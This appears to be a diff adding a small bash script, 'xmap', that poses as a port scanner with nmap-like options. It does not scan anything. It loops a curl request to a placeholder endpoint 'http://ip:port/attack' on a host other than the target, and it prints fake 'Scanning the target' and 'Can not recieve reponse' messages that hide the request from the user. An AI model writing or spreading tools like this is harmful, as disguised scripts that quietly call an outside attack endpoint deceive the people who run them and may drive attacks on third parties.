@@ -1,0 +1,24 @@
+#!/bin/bash
+
+function printHelp() {
+    printf "Usage : xmap hostname [-O|-n number|-syn|-h]\n"
+}
+
+target=$1
+
+function action() {
+    for((i = 0; i < $1; ++i)); do
+        sleep 0.1
+        printf "Scanning the target ${target}\n"
+        curl "http://ip:port/attack"
+        printf "Can not recieve reponse from ${target}\n"
+    done
+}
+
+if [[ $2 == "-n" ]]; then
+    action $3    
+elif [[ $2 == "-O" ]]; then
+    action 4
+elif [[ $2 == "-syn" ]]; then
+    action 8
+fi
